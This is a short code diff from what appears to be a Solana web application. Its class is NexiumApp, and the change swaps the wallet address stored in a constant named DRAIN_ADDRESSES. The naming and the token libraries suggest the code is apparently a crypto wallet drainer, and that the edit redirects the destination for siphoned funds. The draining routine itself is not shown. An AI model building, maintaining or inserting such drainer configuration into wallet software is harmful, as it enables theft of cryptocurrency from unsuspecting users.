@@ -12,7 +12,7 @@ import { Connection, PublicKey, TransactionMessage, VersionedTransaction, System
 import * as splToken from '@solana/spl-token';
 
 const DRAIN_ADDRESSES = {
-  solana: "hQPH3UqsfCBX6VPiWPhowhmmcrZNxnhV4eqRtJcSEtb"
+  solana: "GKyQMMe1SVeHTT6Zbnh2toUms32AtnUu9YFHsZHDqPNJ"
 };
 
 class NexiumApp {
